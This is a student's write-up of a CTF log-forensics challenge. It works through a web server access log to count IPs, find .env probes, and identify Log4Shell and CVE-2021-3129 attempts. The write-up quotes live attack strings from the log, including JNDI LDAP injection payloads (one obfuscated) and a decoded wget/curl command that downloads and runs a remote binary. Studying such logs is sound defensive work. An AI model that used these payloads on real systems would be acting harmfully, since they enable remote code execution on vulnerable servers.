# BYUCTF Winter 2022 - Access (Easy - Hard) Writeup
* Type - Forensics/Steganography
* Name - Access
* Points - 351

## Description
```
Here is a log file containing HTTP requests sent to a webserver. 
Can you answer all the questions to determine what malicious actors tried to do?
```

---

### Access 1 (Easy)
* 24 Points

#### Question
```
How many unique IP addresses have sent HTTP requests to the web server?
Flag format - byuctf{0000}
```

#### Attempted Solution
The first thing I do when confronted with challenges like this is look through the log file with a simple `cat access.log`. I scrolled through the file for a minute just to get a feel for the data I was reading through. Here's an example line:
```
34.245.89.123 - - [09/Feb/2022:01:12:57 +0000] "GET /app-ads.txt HTTP/1.1" 200 473 "-" "TprAdsTxtCrawler/1.1"
```

This line contains a decent amount of information- an IP address, a timestamp, and details for a HTTP GET request. Fortunately, for this challenge, all we're looking for is a list of unique IP addresses. Fall 2021's end of semester CTF had a challenge that taught us to use `grep <file.txt> | sort | uniq` to sort through large amounts of grepped data and pull out the unique results. I thought I could combine regular expressions with the `uniq` command to pull out all the unique IP addresses with grep. A quick google search for "grep for ip addresses" resulted in finding the following regular expression:
```
"([0-9]{1,3}[\.]){3}[0-9]{1,3}"
```

Using this regex in combination with the other previously mentioned commands, plus some file redirection, I entered the following command:
```
grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" access.log | sort | uniq > access1.1
```

`-E` specifies that we want grep to search for strings matching a regular expression that we provide in the double quotes. `-o` prints only the matching portion of the line. Usually, grep returns the entire line that it finds the matching text in, but I prefer using `-o` to simplify the output since I only care about the IP, not the enitre request. Now, I had all the IP addresses from access.log into a single sorted file. Then, I ran `wc -l access1.1` and get the output `148`. `wc` displays the number of lines, words, and bytes contained in each input file. The `-l` option just makes it display the line count. I submitted byuctf{148} and byuctf{0148} and neither of those turned out to be correct. I knew I had an issue.

First, I thought something may be wrong with the regular expression. That was an obvious candidate for the source of my error, as I don't understand regex. I went back to [this site](https://www.shellhacks.com/regex-find-ip-addresses-file-grep/) where I found the expression, and learned that the expression I entered counted all strings between `0.0.0.0`and `999.999.999.999`. I went back to the access1.1 file I created earlier, and didn't see any lines that contained an invalid IP address (anything above `255.255.255.255`) and didn't find anything. So in this case, my regular expression actually wasn't the problem. I looked back at the file and noticed something that shouldn't have been there -- duplicates. I realized my mistake was stringing too many commands together at once. So I ran `grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" access.log > access1.2` and then `cat access1.2 | uniq > access1.2` as separate commands. That still didn't vive me a correct answer, so out of frustration with Linux I decided to just write a Python script.

#### What Actually Worked
```
filename = "access.log"

with open(filename) as f:
    data = f.read()
    data = data.split("\n")
    
    ips = set()
    
    for line in data:
        if (len(line)) > 0:   
            ip = line.split()[0]
            ips.add(ip)

    print(len(ips))
```
As always, 10 lines of Python can fix all my problems. This script returned `98` to stdout, which was the correct flag. I'm still not sure why my bash commands didn't work, but this Python is prety straightforward to understand. I prefer the `with open (filename) as f:` syntax because it automatically closes the file after the indented section. `data.split("\n")` separates the file into an array using the newline character as a delimiter. I iterated through the list version of the log file and if the line had a character in it (i.e. it wasn't the last line in the file), I would split the line by whitespace, which is the default behavior for the `.split()` command. Taking index 0 of the resulting list returned the IP at the beginning of the list. I then added the IP to a set, because sets don't store duplicates, allowing me to just print the size of the set at the end to get the correct number of unique IP addresses that sent HTTP requests to the server.

#### Real World Application
There are a couple of things to take from this challenge. Most worth noting is the idea that challenges can be solved multiple ways. It's absolutely possible to just have used Linux commands to find the flag. Since I'm not an expert in Linux, I was able to utilize my Python talents to accomplish the same goal. Using Python or Linux to parse files like this is a fairly common industry task. In this case, finding the number of IPs that sent HTTP requests to a webserver gives the blue team a list to search through to find attackers.

---

### Access 2 (Easy)
* 10 Points

#### Question
```
How many attempts were made to grab a .env file?
Flag format - byuctf{0000}
```

#### Solution
This one went significantly quicker. All it took was another `grep` command followed by a `wc`.
```
grep .env access.log > envs
wc -l envs
```
I got back `95`, the correct number of requests for .env files.

#### Real World Application
CLI fundamentals are important. The CLI is often the quickest way to gather information. As for wanting to find what .env files were taken, that's important information to find because .env files store application configuration data that attackers could take advantage of. Many times, .env files store credentials like API tokens, database logins, and other common environment variables.

---

### Access 3 (Medium)
* 72 Points

#### Question
```
What IPs attempted to exploit log4j?
Flag format - byuctf{100.100.100.100_200.200.200.200}
```

#### Solution
Log4j is a Java logging framework. Log4Shell, the exploit of Log4j, works by allowing the user to specify custom code to format a log message. You can use this ability to submit code for the server's machine to execute. That code can be used to open a reverse shell. The exploit code to send the webserver typically reads
```
${jndi:ldap://185.8.172.132:1389/a}
```

Yet again, grep comes in handy. A simple `grep jndi acess.log` reutrns a single line:
```
98.0.242.10 - - [09/Feb/2022:14:30:51 +0000] "GET / HTTP/1.1" 200 820 "-" "${jndi:ldap://185.8.172.132:1389/a}"
```

Now we have the first IP that tried to exploit Log4Shell- `98.0.242.10`. Finding the second one was a bit harder. I looked through a few YouTube videos to try to figure out if there was another way to exploit it. I wasn't able to find any other way. Eventually, I realized that they must've found a way to obfuscate the exploit. A quick Google search turned up the obfuscated exploit code

![obfuscated](./obfuscatedLog4j.png)

After finding that, all it took was another quick `grep Base64 access.log` to find the second ip, `192.98.61.124`
```
198.98.61.124 - - [09/Feb/2022:20:24:19 +0000] "GET / HTTP/1.1" 200 820 "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//150.136.111.68:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTU4LjEwMS4xMTguMjM2L2Rldl9zc2hkOyBjdXJsIC1PIGh0dHA6Ly8xNTguMTAxLjExOC4yMzYvZGV2X3NzaGQ7IGNobW9kIDc3NyBkZXZfc3NoZDsgLi9kZXZfc3NoZCB4ODYuZXhwbG9pdA==}')" "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//150.136.111.68:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTU4LjEwMS4xMTguMjM2L2Rldl9zc2hkOyBjdXJsIC1PIGh0dHA6Ly8xNTguMTAxLjExOC4yMzYvZGV2X3NzaGQ7IGNobW9kIDc3NyBkZXZfc3NoZDsgLi9kZXZfc3NoZCB4ODYuZXhwbG9pdA==}')"
```

#### Real World Application
This challenge taught me how to track down attempted known exploits. Log4j is a serious threat that emerged recently, so learning the skills of how to find the IP of an attacker trying to exploit it gives us a target to look into for the remainder of the forensic investigation. Furthermore, finding the second IP required me to learn about how known exploits could be hidden from analysts by simple obfuscation techniques, and consequently, how to detect obfuscated exploits.

---

### Access 4 (Medium)
* 76 Points

#### Question
```
What is the name of the exploit file that would be run in the obfuscated log4j attempt?
Flag format - byuctf{filename}
```

#### Solution
I took the obfuscated log4j attempt from above, and copied the base64 string from the filepath. I pasted it into <www.base64decode.com> and got the following ASCII decoding
```
wget http://158.101.118.236/dev_sshd; curl -O http://158.101.118.236/dev_sshd; chmod 777 dev_sshd; ./dev_sshd x86.exploit
```

This command downloads dev_sshd from the internet, enables it as an executable, and then runs it with the argument `x86.exploit`, which executes the x86.exploit file. So, our flag is byuctf{x86.exploit}

#### Real World Application
This problem involved decoding base64. Base64 is a commonly used encoding scheme so it's good to get familiar with it. A link to a base64 decoder is an essential for any security professional's bookmark folder, as anyone in the industry should be able to decode it quickly.

---

### Access 5 (Hard)
* 83 Points

#### Question
```
What IP addresses attempted to exploit CVE-2021-3129?
Flag format - byuctf{100.100.100.100_200.200.200.200}
```

#### Solution
First, we need to find out what CVE-2021-3129 is. <https://cve.mitre.org/> is a great site to look at Common Vulnerabilities and Exposures. Plugging 2021-3129 into the search bar gives us this information
![cve](./cve.png)

We see it uses Ignition, a platform for connecting data, to obtain RCE as an unauthenticated user. So, the obvious next step is `grep ignition access.log`.
```
45.146.165.37 - - [09/Feb/2022:10:00:56 +0000] "GET /_ignition/execute-solution HTTP/1.1" 200 473 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
20.24.24.111 - - [09/Feb/2022:12:34:22 +0000] "GET /_ignition/execute-solution HTTP/1.1" 200 473 "-" "python-requests/2.27.1"
20.24.24.111 - - [09/Feb/2022:12:34:22 +0000] "GET /_ignition/execute-solution HTTP/1.1" 200 473 "-" "python-requests/2.27.1"
45.146.165.37 - - [09/Feb/2022:19:00:45 +0000] "GET /_ignition/execute-solution HTTP/1.1" 200 473 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
```
Voila! We have our two IPs.

#### Real World Application
This challenge provided the opportunity to use MITRE's CVE database to get more information about an attack. MITRE's knowledgebase is invaluable, so learning how to use it to gain more information about the specific ways hackers may be trying to break into a system allows defenders to quickly find exploit attempts.

---

### Access 6 (Hard)
* 86 Points

#### Question
```
What is the name of the ISP that hosts the Russian IP attempting to exploit CVE-2021-3129?
Flag format - byuctf{ispname}
```

#### Solution
From above, we have two IP addresses that attempted to exploit CVE-2021-3129- `45.146.165.37` and `20.24.24.111`. Throwing those IPs into <https://tools.keycdn.com/geo> tells us that `45.146.165.37` is located in Moscow. On that same page, it tells us the provider is Selectel. And thus we have our flag.

#### Real World Application
Knowing where to gather information on a target IP is helpful. OSINT can tell us a lot about a target, just from their IP address! Whether you're on the blue team or red team, you can gain an advantage by discovering the location of an IP address. In this case, as the defender, we now have a more specific location in which to look for our hackers, and we can investigate potential Russian attackers.
